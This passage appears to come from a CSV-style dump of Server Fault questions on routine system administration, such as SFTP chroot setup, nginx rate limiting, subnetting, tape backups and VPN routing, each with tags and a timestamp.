<p>Edit the /etc/ssh/sshd_config file.</p>

<p>Add or modify the Subsystem sftp line to look like the following:</p>

<pre><code>Subsystem sftp internal-sftp
</code></pre>

<p>Add the below block of text to the bottom of the file:</p>

<pre><code>Match Group filetransfer
    ChrootDirectory %h
    X11Forwarding no
    AllowTcpForwarding no
    ForceCommand internal-sftp
</code></pre>

<p>Restart OpenSSH:</p>

<pre><code>service ssh restart
</code></pre>

<p>Create a system group for users whom you want to restrict to SFTP access:</p>

<pre><code>addgroup --system filetransfer

sudo adduser username #added user
usermod -G filetransfer username #added him to the group
chown root:root /home/username #disabled access to his default home directory
chmod 755 /home/username
</code></pre>

<p>Changed the permissions directory I want him to be able to modify:</p>

<pre><code>cd /srv/www/website_name/public_html/wp-content/themes/
chown username:filetransfer specific_folder
chown username:filetransfer specific_folder/*
</code></pre>

<p>Set this folder as his home directory:</p>

<pre><code>sudo usermod -d /srv/www/website_name/public_html/wp-content/themes/specific_folder username
</code></pre>

<p>But now I'm not able to connect using SFTP. This fails after I change his home directory. What should I do to fix this?</p>
","<ubuntu><ssh><ubuntu-12.04><sftp>","2016-03-24 09:28:38"
"765920","Get a list of installed optional features on Windows XP","<p>In Win7+ i can run the following command to get a list of optional features:</p>

<pre><code>wmic path Win32_OptionalFeature get Caption,InstallState
</code></pre>

<p>How can i get a similar list on WinXP, natively?</p>
","<windows-xp>","2016-03-24 17:05:49"
"765952","Separate subnet with exceptions","<p>I have a network with clients in the 192.168.30.x range and clients in the 192.168.40.x range. both are in a 255.255.0.0 subnet.<br>
All clients with .30.x are connected to one switch and all clients with .40.x connected to another switch and both switches are connected.<br>
All clients with .30.x have a connection to the .40.x clients and vice versa.<br>
Now we want to separate the network into two networks but need a exception. Two clients still need a connection. .30.10 must be able to connect to .40.1 (and .40.1 to .30.10)  </p>

<p>How can we manage this, what would we need to get this working without changing anything on the clients ? It is possible, because of the same subnet ?  </p>

<p>We have a <a href=""http://www.pcengines.ch/apu.htm"" rel=""nofollow noreferrer"">pc engines apu</a> with <a href=""http://www.ipfire.org/"" rel=""nofollow noreferrer"">ipfire</a> installed on it, is this maybe an option to achieve this ?</p>
","<networking><firewall><subnet>","2016-03-24 18:54:46"
"856689","Nginx rate limiting at server level excluding a particular IP","<p>My server is constantly being flooded and I am looking to limit the connections. I want to do this at the server level (because I have multiple websites) but every now and then I run a cache warm script from a particular IP. </p>

<pre><code>limit_req_zone $binary_remote_addr zone=one:10m rate=30r/m;
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_req zone=one;
limit_conn addr 10;
</code></pre>

<p>How I can do rate limiting but exclude this particular IP (or set of IPs)</p>
","<nginx><rate-limiting><attacks><traffic-management>","2017-06-19 19:00:26"
"766021","How we can control the internet of our faculty at university?","<p>I have a problem, in my faculty at university (CS)
we will have our own internet line(30Mb), this is fast compared to the regular internet that provides us the university (really more slow and very restricted). Well, we are approximately 150 ~ 200 students and we need do a management of the network, to avoid downloads or games that could do more slowly the internet. Almost all students wanna do more investigation and learn more, and for do much better the assignments of the courses. I wanna know if there is a possible solution for do this and We really want that it don't will have a high cost(we are in an state college), we have computers for make a network server or some else. Thank you!!</p>
","<networking>","2016-03-25 03:59:46"
"856751","Share a Linux Host's Folder With a Windows Guest Without Networking","<p>I need to share a linux host's folder with a Windows guest, however this Windows machine will not be allowed to have internet support so no NIC will be added to the device. How do I share a folder with a Windows guest without internet?</p>
","<kvm-virtualization><network-share>","2017-06-20 07:32:11"
"856780","Is it possible to replace 'restart' in windows with a script?","<p>I would like to replace 'restart'; meaning, when I press restart I would like the computer to execute a script instead.</p>

<p>Is there maybe a restart file that runs when I press restart that I can edit or change? Maybe through group policy?</p>

<p>The reason I need this is because there are operations that I would like to execute before each shutdown/restart. </p>

<p>I have already exhausted the option of shutdown and logoff script via group policy.</p>
","<windows><group-policy><shutdown>","2017-06-20 10:32:02"
"856786","nginx rewrite rule for a variable subdomain","<p>Please help me create a rewrite rule in Nginx so that this URL <a href=""https://subdomain.domain.com/api"" rel=""nofollow noreferrer"">https://subdomain.domain.com/api</a> gets re-written to <a href=""https://subdomain-api.domain.com"" rel=""nofollow noreferrer"">https://subdomain-api.domain.com</a></p>

<p>Thanks in advance.</p>
","<nginx><rewrite>","2017-06-20 10:50:18"
"856797","Custom domain mapping to web application","<p>We are creating a SAAS base application, where every company get its own subdomain. But if the company wants to configure another domain with our application, they can do that.</p>

<p>e.g. I am a company registered with the application www.saas.com, i got the subdomain company.saas.com, now i want to point my company.com domain to the company.saas.com, so how we can achieve this?</p>

<p>i know it can be done using Cname but is there a way to dynamic update Cname?</p>
","<domain-name-system><cname-record><mapping><saas>","2017-06-20 11:53:53"
"766137","If my server PDC Emulater is down then how to re up PDC again functioning?","<p>My pdc emulater is down so plz guide me how to bring up pdc and it working fine.
This question also asking many time from interviewer. so plz guide me all total way to solve this. </p>
","<active-directory>","2016-03-25 17:45:05"
"766171","Can I restrict openssh to only allow public keys with pass phrases","<p>Is it possible to configure ssh using <code>PubkeyAuthentication yes</code> but only allowing pub/private key pairs with a passphrases?</p>
","<linux><ssh>","2016-03-25 22:14:46"
"937062","How to upgrade from Java 7 to Java 8 on Amazon Linux","<p>I found <a href=""https://serverfault.com/questions/664643/how-can-i-upgrade-to-java-1-8-on-an-amazon-linux-server"">another thread</a> on this that is outdated and doesn't give a non-interactive way to do this. If you need to upgrade from Java 7 to Java 8 to run Jenkins, or whatever other Java application, you can do that by plugging this into a user_data script for Amazon Linux</p>
","<amazon-web-services><amazon-ec2><java><amazon-linux>","2018-10-24 21:49:19"
"856861","Alias for sublocations in nginx","<p>I have a webservice using the following routes in nginx:</p>

<pre><code>/my/myservice/backend
/my/myservice/frontend
</code></pre>

<p>In addtion, I want the two urls</p>

<pre><code>/my/myservice
/my/myname
</code></pre>

<p>to be aliases or redirects to <code>/my/myservice/frontend</code>
ow can I configure nginx to achieve this?</p>
","<linux><nginx><web-server><web-services>","2017-06-20 15:49:45"
"766221","Virtual Server vs Dedicated Server","<p>Could experts help me summarily tell me before deploying my web service App? Please. What is the downside of choosing Virtual Server over Dedicated Server? </p>
","<amazon-web-services><web-server><virtual-machines>","2016-03-26 11:53:49"
"766231","When downloading two files, why does the second one not suddenly speed up after the first one finishes?","<p>I have noticed that when I am downloading several files at a time, and one of them finishes, the bandwidth that it was consuming is not immediately apportioned to the others. For example, if I have two files being downloaded at 100 Kb/s each, and one finishes, the other does not immediately go up to 200 Kb/s. It does speed up but rather slowly, maybe a few Kb/s every few seconds.</p>

<p>Similarly, when I am downloading one file at 200 Kb/s and then start downloading another one, the first one does not immediately slow down to allow the other one an equal amount of bandwidth.</p>

<p>These are tiny downloads compared to the server and network capacity, so it can't be a capacity issue. Why is my computer, or the server, so slow to distribute the bandwidth equally among the downloads?</p>

<p>Note that I am not asking why my download is slow. I am asking why the <em>redistribution of bandwidth</em> among concurrent downloads is slow.</p>
","<bandwidth>","2016-03-26 13:51:43"
"766276","Can't delete last empty line","<p>I've a .txt file from which I'd like to delete the last, empty line.
I've tried a ridiculous number of sed, perl and awk commands found on the internet, but none of them has worked.</p>

<p>I don't know what does it mean, but I leave you the output of <strong>od -c myfile.txt</strong></p>

<pre><code>od -c myfile.txt
0000000   2   1   7   .   2   9   .   2   3   0   .   0   /   2   4  \n
0000020   1   9   4   .   1   9   7   .   1   5   1   .   1   6   0   /
0000040   2   7  \n   1   9   4   .   1   8   8   .   6   6   .   0   /
0000060   2   3  \n   1   9   4   .   1   8   8   .   6   5   .   0   /
0000100   2   4  \n   1   9   4   .   1   4   2   .   1   6   8   .   2
0000120   4   8   /   2   9  \n   1   9   4   .   1   4   2   .   2   4
0000140   .   1   2   8   /   2   9  \n   1   9   4   .   1   3   7   .
0000160   1   3   3   .   0   /   2   4  \n   1   9   4   .   1   1   2
0000200   .   1   4   .   0   /   2   3  \n   1   9   4   .   1   1   2
0000220   .   1   3   .   1   2   8   /   2   5  \n   1   9   4   .   1
0000240   1   2   .   1   3   .   6   4   /   2   6  \n   1   9   4   .
0000260   1   1   2   .   1   3   .   3   2   /   2   7  \n   1   9   4
0000300   .   1   1   2   .   1   3   .   1   6   /   2   8  \n   1   9
0000320   4   .   1   1   2   .   1   2   .   0   /   2   4  \n   1   9
0000340   4   .   1   1   2   .   1   0   .   0   /   2   3  \n   1   9
0000360   4   .   1   1   2   .   9   .   0   /   2   4  \n   1   9   4
0000400   .   1   1   2   .   8   .   2   2   4   /   2   7  \n   1   9
0000420   4   .   1   1   2   .   8   .   2   0   8   /   2   8  \n   1
0000440   9   4   .   1   9   7   .   2   0   8   .   0   /   2   4  \n
0000460   1   9   4   .   2   4   0   .   5   4   .   0   /   2   4  \n
0000500   2   1   3   .   2   0   4   .   6   2   .   0   /   2   3  \n
0000520   2   1   3   .   2   0   4   .   6   0   .   0   /   2   4  \n
0000540   2   1   3   .   2   0   4   .   5   6   .   0   /   2   2  \n
0000560   2   1   3   .   2   0   4   .   5   2   .   0   /   2   2  \n
0000600   2   1   3   .   2   0   4   .   5   0   .   0   /   2   4  \n
0000620   2   1   3   .   2   0   4   .   4   8   .   0   /   2   3  \n
0000640   2   1   3   .   2   0   4   .   3   2   .   0   /   2   0  \n
0000660   2   1   3   .   2   8   .   1   4   8   .   0   /   2   8  \n
0000700   2   1   2   .   2   1   3   .   2   1   1   .   3   2   /   2
0000720   8  \n   2   1   2   .   2   1   3   .   9   5   .   3   2   /
0000740   2   8  \n   2   1   2   .   1   7   .   1   7   6   .   0   /
0000760   2   2  \n   2   1   2   .   1   7   .   1   6   8   .   0   /
0001000   2   1  \n   1   9   5   .   2   3   7   .   3   2   .   0   /
0001020   2   4  \n   1   9   5   .   1   6   5   .   6   8   .   1   2
0001040   8   /   2   6  \n   1   9   4   .   2   5   2   .   6   1   .
0001060   1   3   2   /   3   0  \n   1   9   4   .   2   5   1   .   2
0001100   0   8   .   0   /   2   1  \n   1   9   4   .   1   1   2   .
0001120   8   .   2   0   0   /   2   9  \n   1   9   4   .   1   1   2
0001140   .   8   .   1   2   8   /   2   6  \n   1   9   4   .   1   1
0001160   2   .   8   .   0   /   2   5  \n   8   2   .   1   9   9   .
0001200   1   8   5   .   0   /   2   4  \n   8   2   .   1   9   9   .
0001220   1   8   4   .   2   4   8   /   3   0  \n   8   2   .   1   9
0001240   9   .   1   8   4   .   2   4   0   /   2   9  \n   8   2   .
0001260   1   9   9   .   1   8   4   .   2   2   4   /   2   8  \n   8
0001300   2   .   1   9   9   .   1   8   4   .   1   9   2   /   2   7
0001320  \n   8   2   .   1   9   9   .   1   8   4   .   1   2   8   /
0001340   2   6  \n   8   2   .   1   9   9   .   1   8   4   .   0   /
0001360   2   5  \n   8   2   .   1   9   9   .   1   8   2   .   0   /
0001400   2   3  \n   8   2   .   1   9   9   .   1   7   8   .   0   /
0001420   2   3  \n   8   2   .   1   9   9   .   1   7   7   .   0   /
0001440   2   4  \n   8   2   .   1   9   9   .   1   7   4   .   0   /
0001460   2   3  \n   8   2   .   1   9   9   .   1   7   1   .   0   /
0001500   2   4  \n   8   2   .   1   9   9   .   1   6   9   .   0   /
0001520   2   4  \n   8   2   .   1   9   9   .   1   6   0   .   0   /
0001540   2   1  \n   7   9   .   1   3   3   .   0   .   0   /   1   9
0001560  \n   6   2   .   1   4   2   .   7   2   .   1   1   2   /   2
0001600   9  \n   8   2   .   1   9   9   .   1   8   6   .   6   4   /
0001620   2   6  \n   8   2   .   1   9   9   .   1   8   7   .   1   2
0001640   8   /   2   5  \n   1   9   4   .   1   1   2   .   0   .   0
0001660   /   2   1  \n   1   9   4   .   1   1   1   .   2   0   2   .
0001700   0   /   2   3  \n   1   9   4   .   1   1   1   .   1   6   3
0001720   .   0   /   2   4  \n   1   9   4   .   1   1   0   .   1   7
0001740   6   .   0   /   2   0  \n   1   9   4   .   1   0   0   .   4
0001760   9   .   0   /   2   5  \n   1   9   3   .   2   1   0   .   5
0002000   .   1   3   6   /   2   9  \n   1   9   2   .   1   9   4   .
0002020   2   5   0   .   9   6   /   2   7  \n   1   9   2   .   1   9
0002040   4   .   2   4   3   .   7   6   /   3   0  \n   1   9   2   .
0002060   1   9   4   .   2   1   4   .   1   1   2   /   2   8  \n   1
0002100   9   2   .   1   3   0   .   2   4   3   .   0   /   2   8  \n
0002120   1   9   2   .   1   3   0   .   1   9   6   .   1   2   8   /
0002140   2   7  \n   1   9   2   .   8   9   .   2   5   4   .   0   /
0002160   2   4  \n   1   9   2   .   8   9   .   2   4   0   .   6   4
0002200   /   2   7  \n   1   9   2   .   8   9   .   5   4   .   0   /
0002220   2   5  \n   1   9   2   .   8   9   .   3   .   8   /   3   0
0002240  \n
0002241
</code></pre>

<p>How the hell can I delete that last, empty line?</p>
","<sed><filestream>","2016-03-26 22:40:30"
"766358","Deep packet Inspection Stenography","<p>I'm trying to develop something that can get around Deep Packet Inspection so that rather than looking like OpenVPN traffic etc, I could put all that into HTTP packets as extra information or some other protocol. I would control the client and the server machines and could communicate securely as I'd be in OpenVPN but the packets would be disguised as legit HTTP traffic hiding the extra OpenVPN traffic in there.</p>

<p>I understand there would be issues with integrity of the packets if someone knew this was happening and that security through obscurity isn't best practise.</p>

<p>My questions are really to ask what your thoughts are on the implementation. How would you go about this?</p>

<p>I believe that it would work something like:</p>

<ol>
<li>Force NIC through iptables or static route through my own virtual interface.</li>
<li>Sniff my interface and modify so that packets can be changed and the relevant other traffic (voip, SSL) etc be added in the traffic of HTTP, then pump through eth0 to the internet.</li>
<li>When it reaches the destination server, it does the opposite to decrypt the traffic.</li>
<li>Process the traffic through the server and report back.</li>
</ol>

<p>I've found stunnel and obfsproxy so far but I don't believe that's the same concept.</p>

<p>This is very much an idea in progress. Can you please advise of your thoughts? Any feedback welcome.</p>

<p>Thanks,
truex0r</p>
","<linux><networking><security><hacking><privacy>","2016-03-27 16:10:34"
"937398","Postfix log to MySQL","<p>I would like to log datetime, sender and recipient to a MySQL table for all mail send through Postfix/Dovecot (virtual users setup).</p>

<p>How can this be done?</p>

<p>Best regards.</p>
","<postfix><dovecot>","2018-10-26 15:23:06"
"766440","6/8-pin to SATA Power/4 pin Molex cable non-existent?","<p>I'm having a hard time to find a cable that would convert 8 pin or 6 pin GPU power connector to multiple SATA power connectors. The ones I've found are working in reverse direction, such as: <a href=""http://rads.stackoverflow.com/amzn/click/B007Y8FSMQ"" rel=""nofollow noreferrer"">http://www.amazon.com/StarTech-com-SATPCIEX8ADP-6-Inch-Express-Adapter/dp/B007Y8FSMQ</a></p>

<p>What I'm looking for is the complete opposite of this. After an hour of Google'ing, I have nothing. Is such cable not possible?</p>

<p><strong>Real problem:</strong></p>

<p>Dell R720 has a 8-pin female power connector to install GPU cards. As shown:</p>

<p><a href=""https://i.sstatic.net/dZyWu.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/dZyWu.jpg"" alt=""enter image description here""></a></p>

<p>What I'd like to have is a cable or a series of cables to convert this power connector to SATA power cable (to use on a U.2 to PCI-E converter to install a NVMe SSD)</p>
","<dell>","2016-03-28 10:09:30"
"766447","""Hide"" an Active Directory domain in an open network","<p>I would like to have a stand-alone Active Directory deployment within an open network in a way that it isn't visible as a logon option or a workgroup to other, non-joined computers.  The plan so far was to:</p>

<ol>
<li>Spin up server #1, make it a PDC</li>
<li>spin up server #2, set its DNS to PDC, join
domain</li>
<li>hide it somehow</li>
<li>profit!</li>
</ol>

<p>What should be disabled so that the domain joined servers don't advertise their AD/Workgroup?</p>
","<windows><active-directory><workgroup>","2016-03-28 10:41:42"
"766492","Cannot access Internet after connected to VPN","<p>I have set up a VPN on my CentOS server. Client side can connect to sever 
side, and ping to each other. However, I can not access internet any more.</p>

<pre><code>lo        Link encap:Local Loopback
      inet addr:127.0.0.1  Mask:255.0.0.0
      inet6 addr: ::1/128 Scope:Host
      UP LOOPBACK RUNNING  MTU:65536  Metric:1
      RX packets:0 errors:0 dropped:0 overruns:0 frame:0
      TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0
      RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)

ppp0      Link encap:Point-to-Point Protocol
      inet addr:192.168.9.1  P-t-P:192.168.9.11  Mask:255.255.255.255
      UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1496  Metric:1
      RX packets:748 errors:0 dropped:0 overruns:0 frame:0
      TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:3
      RX bytes:44177 (43.1 KiB)  TX bytes:84 (84.0 b)

seth0     Link encap:Ethernet  HWaddr 00:15:5D:A0:02:BB
      inet addr:118.193.160.45  Bcast:118.193.160.63  Mask:255.255.255.192
      inet6 addr: fe80::215:5dff:fea0:2bb/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:467576 errors:0 dropped:0 overruns:0 frame:0
      TX packets:165699 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:94233225 (89.8 MiB)  TX bytes:45836762 (43.7 MiB)

virbr0    Link encap:Ethernet  HWaddr 52:54:00:54:43:1B
      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:0 errors:0 dropped:0 overruns:0 frame:0
      TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0
      RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
</code></pre>

<p>I enabled ipv4 forwarding ,also I can roll out that this is not a DNS issue.</p>
","<centos><vpn>","2016-03-28 14:19:09"
"766501","GPO Settings on HKLM\Software\Classes Registry Keys","<p>We are beginning to deploy a couple of Windows 10 systems into our environment for application compatibility testing. Currently, we are Windows 7 x64 across the board. We've begun noticing recently on our W10 systems, that as soon as our Default Domain Policy GPO is applied, they begin experiencing a world of different problems. Most noticeably, just clicking on any objects (Start Menu, Apps) doesn't do anything. This issue is not present if you keep the machine in an OU where the Default Domain Policy is not applied.</p>

<p>Our Default Domain Policy has existed for a quite a while as our environment has progressed through 2000, 2003, and on to 2008 (Current DFL is 2008 R2). Inside the policy, there is a ton of old settings still present and unfortunately not a ton of documentation from the prior admin. I think I've narrowed down the issue to one particular group of settings.</p>

<p>The previous admin has the GPO touching a ton of Registry settings located at</p>

<p>(configured in the GPO as Computer Configuration\Policies\Windows Settings\Security Settings\Registry)</p>

<p>HKLM\Software\Classes</p>

<p>and then for, seemingly random reasons, random keys beneath it. The permissions that are being set against these keys tend to look fairly normal</p>

<p>SYSTEM
Administrators
Users
Power Users
INTERACTIVE</p>

<p>If I make a copy of the Default Domain Policy and remove this section, then my W10 systems operate as expected. For the life of me, I cannot figure out why this is configured or what it's doing short of maybe it was necessary when we were still a 2000/2003 domain. I'm hoping to gain a little insight on anyone who may have an idea on why this might be configured before I remove it from our Default Domain Policy.</p>

<p>Thank you all</p>
","<active-directory><windows-server-2008-r2><group-policy><windows-10>","2016-03-28 15:12:06"
"766530","Unable to remove wireless drivers from HP laptop","<p>We do have HP Laptops for the users where we dont need any wireless Adapters.</p>

<p>We tried uninstalling Wireless drivers from device manager, after a reboot the wireless adapter reappear again.</p>

<p>We restrict most of the websites from firewall. Users are trying to connect wireless to their mobile hotspot network. (All the users are Local Admins on their respective laptops)</p>

<p>How do we remove drivers Completely?</p>

<p>All the laptops (HP Pro Book 450 G1) are running on Windows10.</p>
","<wifi><windows-10>","2016-03-28 17:02:23"
"857197",".htaccess help preventing robots","<p>I want to create a .htaccess that does the following things:</p>

<ol>
<li>Routes all files through to /index.php</li>
<li>Forces use of SSL</li>
<li>Doesnt allow robots to load individual PHP files.  For instance, if a robot wants to load /pages/folder/file.php  It won't allow it.  I'm constantly getting error files because robots load those pages and the database variable isnt set or something.  However I need my website's javascript to be able to access it.  </li>
</ol>

<p>So far I've for the first two down, (I think):</p>

<pre><code>        #Redirect all quries to SSL port 443
        RewriteCond %{SERVER_PORT} !^443$
        RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

        # Don't allow www, redirect to https://
        RewriteEngine On
        RewriteBase /
        RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
        RewriteRule ^(.*)$ https://%1/$1 [R=301,L]

        # Route everything via index.php
        RewriteBase /
        RewriteRule ^index\.php$ - [L]

        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule . /index.php [L]
</code></pre>

<p>Is this correct? Is it in the right order? How can I achieve point three?</p>
","<.htaccess><apache2>","2017-06-22 07:07:55"
"857221","Latency issues when inserting content to China","<p><strong>Background</strong></p>

<hr>

<p>We have an app that will write into a postgres db hosted in Frankfurt datacenter. 
The app is installed in each of the 8 sites we have around the world, from China, Korea, India , Germany, France and Mexico.</p>

<p>When connecting in Europe, to the Frankfurt database, the response times are good. However, when connecting from the northern part of China, the response time are plain slow.
The China great firewall is delaying the response time and adding to that, the distance is a decisive factor.</p>

<p>We decided to setup a second database in Korea for our asian sites. The app in the Korean and Chinese site would be feeding the 
korean database.  It reduced the latencies dramatically and worked like a charm.</p>

<p>Issue is there are no way to copy the data between the Korean database and the German database as bidirectional replication is not allowed.</p>

<p>We are now back to square one as we are unsure what steps to take as we only need a single database but we want decent response time.
We don't want to rewrite the app.</p>

<p><strong>Questions:</strong></p>

<hr>

<ul>
<li>We want a solution where we can host a database and where there would be decent response time, for every site around the world. 
What other solutions other than RDS can we look at?</li>
<li>If we keep going with RDS, is there a datacenter that can manage decent time response for all over the world?</li>
</ul>

<p>Not sure if this the right place to ask this question. If no, please leave a comment and I will delete the question.</p>
","<postgresql><rds><architecture>","2017-06-22 09:19:38"
"981787","Creating a WiFi Access Point with a New IP Space","<p>I just moved into a dorm where each room gets a limited range of IP addresses to connect their devices to. For the sake of comfort (I don’t want to assign fixed IP addresses to each of my devices), I would like to set up some kind of switch or repeater that I can connect to with an automatic IP.</p>

<p>I’ve already tested it with the “Create Hotspot” function in Windows 10 and it works perfectly. Now I need some advice on which physical device can create that behaviour and how to set it up.</p>
","<networking><wifi><local-area-network><repeater>","2019-09-04 06:02:47"
"937710","Closing All Shared Files on the Network","<p>I am trying to close all of the open files in the shared folders of a server via PowerShell script. I found the following script which only close files on one drive (F:), however, this server has 3 drives (F:\, G:\, H:) which I want to close all. </p>

<pre><code>net files | 
    where   { $_.Contains( ""F:\"" ) } |
    foreach { $_.Split( ' ' )[0] }   |
    foreach { net file $_ /close }
</code></pre>

<p>Is there a way to add missing drives into this script or I have to use the same script separately for each drive?</p>

<p>I tried <code>{ $_.Contains( ""F:\"", ""G:\"", ""H:\""  ) }</code> but didn't work</p>

<p>Thank you for your help!</p>
","<powershell><network-share><shell-scripting>","2018-10-29 15:14:24"
"857315","Moving data to tape","<p>At my new workplace, I am expected to backup older data (large image-files) to tape. As someone who as never used tapes, I have a few questions regarding them. It would be great if someone can point me to a guide on the web or answer them here. </p>

<p>Currently, I am able to query the tape drive using the command <code>mt</code>. Along with this mt has options to move the tape head from one file boundary to another</p>

<pre><code>mt -f /dev/st0 status
</code></pre>

<p>Moving the data seems straight forward using tar.</p>

<pre><code>tar cvf /dev/st0 somedirectory/
</code></pre>

<p>The part that I am not able to understand is how do I query how much space is available on the tape volume? The tapes I am testing are HP LTO-5 Ultrium(1.5TB uncompressed).</p>

<p>Also, how does one create volumes that can span over multiple tapes? Say a folder of size 10TB? </p>

<p>Once this system is working, I intend to archive 10TB of data every six months on two different sets of tapes. </p>
","<backup><tapedrive>","2017-06-22 17:02:57"
"857371","How to optimize vCSA Tiny peformance housed over 100 VMS?","<p>vSphere Cluster is 3x HPE DL380 G8 with 128GB RAM on board connected to 3PAR. The total number of running VMs is over 60. Although the vCSA deployment size is Tiny meaning there should be the enough resources to maintain the production, the project I currently work on requires the installation of over than 50 VMs more. Therefore, I need to ensure the vCSA configuration could handle the desired workload until we are ready to update the vCSA configuration. </p>

<p>By following the recommendations <a href=""https://www.starwindsoftware.com/blog/vmware-vcenter-server-appliance-homelab-tips"" rel=""nofollow noreferrer"">https://www.starwindsoftware.com/blog/vmware-vcenter-server-appliance-homelab-tips</a> I have already lowered from 8 to about 7Gb RAM by disabling updates, vsan health service, dump collector and HTML5 UI. Is there anything else can be tweaked? </p>
","<vmware-vsphere><vmware-vcenter>","2017-06-22 20:52:28"
"981943","How to know what Wordpress PHP file is making external requests?","<p>My hosting provider is telling me that they are misusing my server, I want to know which of my 40 wordpress sites is doing bruteforce to other wordpress sites external to my server.</p>

<p>I scanned with clamav but found nothing.</p>

<p>How can I mitigate the attack?</p>

<p>Use debian 9, vestacp panel, nginx, php-fpm</p>
","<nginx><php><php-fpm><wordpress>","2019-09-05 02:13:33"
"981969","Dropped idle connection after 5 minutes","<p>we're having a strange issue with our Azure virtual machines. When we make a connection to the servers, via socket, then leave it idle for exactly 5 minutes, the connections gets dropped. It does not matter in which country the server is booted up, we get the same thing. Is there an automatic idle connection drop on azure?</p>

<p>We have tested this on servers hosted with other providers and the idle connection stays alive as long as we need it.</p>

<p>Hope someone knows how to resolve this?</p>

<p>Thanks.</p>
","<linux><azure><connection>","2019-09-05 07:21:30"
"981971","How to force the use of an ip of my server","<p>How to force the use of an ip of my server
<strong>eth0:1</strong>, if my server interoge example google.com</p>

<p>when i use my php scripts, the ip that google must see is <strong>eth0:1</strong></p>

<pre><code># The primary network interface
auto eth0
iface eth0 inet static
    address 173.249.3.15
    netmask 255.255.255.0
    gateway 173.249.3.1
    dns-search invalid
    dns-nameservers 213.136.95.10 213.136.95.11
    up ip route replace 173.249.3.0/24 via 173.249.3.1 dev eth0

# new ip
auto eth0:1
iface eth0:1 inet static
    address 164.68.125.112
    netmask 255.255.255.0
    gateway 164.68.125.1
</code></pre>
","<networking><interface><eth0>","2019-09-05 07:45:24"
"981996","Access Denied to server linux SSH","<p>I can't access the server using ssh user@IP with the right password i get access denied even though the sshd config is set correctly i restarted it reloaded nothing worked.
I generated an rsa key over one machine the only one that can access the server anny suggestions </p>
","<linux><centos><ssh><security><ssh-keys>","2019-09-05 10:13:24"
"766808","Use Windows license from physical machine on hosted VM within linux","<p>I have a bunch of Dell machines that came with BIOS-injected Windows 7 licenses. They have all been upgraded to Windows 10 and now show as having a valid ""digital entitlement"" license.</p>

<p>These are powerful machines that are normally booted into Ubuntu (dual-boot) as development environments. </p>

<p>We have a corporate Active Directory and I'd like to have the machines run a Windows VM on Virtualbox so they can be domain joined and easily access the Windows managed network resources when they need to. Physically rebooting the whole machine into Windows is too painful as it requires my devs shutting down all their other development VMs and effectively interrupting all their other work.</p>

<p>Is there any way I can use the valid Windows license (in the BIOS) that these machines have within a VM? I should mention that my devs aren't interested in having Windows as the physical host OS.</p>
","<windows><windows-10>","2016-03-29 16:43:30"
"857500","Enable zookeeper on google app engine","<p>I am new to Google Cloud Platform.
I have created two microservices and deployed into app engine. It works in GCP.
Now I want to enable microservices communications using ZooKeeper on app engine.
Could you please help me on achieve service discovery using Zookeeper</p>

<p>Thanks in advance</p>
","<google-cloud-platform>","2017-06-23 11:45:44"
"766846","Import sample Active Directory into LDAP","<p>For development purposes so I can query and test a C# LDAP integration, I have set up an Active Directory Lightweight Directory Services (AD LDS) instance on my Windows 10 box.  I need to populate this with an LDAP structure taken from a sample Active Directory implementation.  Test data is fine (vs someone's live production data).</p>

<p>Here are my questions...</p>

<ol>
<li>Can I initialize my local AD LDS store with sample data taken from AD?</li>
<li>If so, how is this done?</li>
<li>Is there somewhere I can obtain a downloadable sample AD LDAP structure that can be used to import/initialize my local AD LDS store?</li>
</ol>
","<active-directory><ad-lds><adam>","2016-03-29 18:46:41"
"938055","How to create a SQL Server Database from DBML","<p>I have corrupted an entire database and I have no access to it or backups. Is there a way to recreate the structure of it using a .dbml from visual studio project?
Thank you in advance.</p>
","<sql-server><database><sql><visual-studio>","2018-10-31 14:53:25"
"857567","How to set a type DNS?","<p>I have a dedicated hosting and I am trying to set the dns on the server side to an a type dns. Lets say my domain is: myDomain.com and I  have already pointed it at the registery to ns1.myDomain.com and ns2.myDomain.com. This is supposed to point at an IP. I manage the server with DirectAdmin and the server runs on Centos. </p>

<p>The problem: I don't seem to be able to set the domain at my server correctly. I have gone so many ways that I don't know if I already set something wrong somewhere else but whenever I try to go to the domain at the browser I get: <strong>myDomains.com’s server DNS address could not be found.</strong></p>

<p>To make the question summirize: How do I set an a type dns through DirectAdmin or SSH having the IP?</p>
","<nameserver><dns-hosting>","2017-06-23 17:21:21"
"938108","Getting new ip address automatically","<p>i want to get new public IP addresses from DHCP and add it to my <code>etc0</code> device.</p>

<p>how can i get IPs and append them? and also is there any limit on it?</p>

<p>i talked to network manager on my datacenter and he said there is no issue for getting new IPs.</p>

<p>** please note that i want to append new ip addresses to my device, i don't want to change it</p>
","<ip><centos7>","2018-10-31 19:01:21"
"766903","How are IP packets routed from LAN to WAN?","<p>I have OpenWRT set up on a router, with a wireless client connected on the LAN, and connected to another network on the WAN. <code>wlan1</code> is bridged on the <code>br-lan</code> interface, and typically forwards to the LAN interface <code>eth0</code>.</p>

<p>I'm currently sending TCP/UDP packets from a client (<code>192.168.1.20</code>) on the LAN to a server (<code>128.112.94.34</code>) on the WAN. When I run <code>tcpdump -len -i br-lan</code> (viewing the packets on the <code>br-lan</code> interface, I can see each of these packets coming through, something like:</p>

<pre><code>22:12:03.055370 58:7f:57:0c:e4:80 &gt; c0:56:27:72:a3:5b, ethertype IPv4 (0x0800), length 73: 192.168.1.20.49437 &gt; 128.112.94.34.12341: Flags [P.], seq 105:112, ack 1, win 4117, options [nop,nop,TS val 581515569 ecr 1500229582], length 7
